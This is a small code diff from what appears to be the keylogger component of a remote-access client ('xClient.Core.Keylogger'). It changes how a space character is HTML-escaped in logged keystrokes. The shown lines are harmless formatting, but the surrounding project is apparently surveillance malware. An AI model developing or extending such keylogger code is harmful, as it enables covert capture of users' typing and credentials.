@@ -22,8 +22,8 @@ namespace xClient.Core.Keylogger
                     return "&quot;";
                 case '\'':
                     return "&apos;";
-                case ' ': // space is already proccessed by OnKeyDown
-                    return string.Empty;
+                case ' ':
+                    return "&nbsp;";
             }
             return key.ToString();
         }
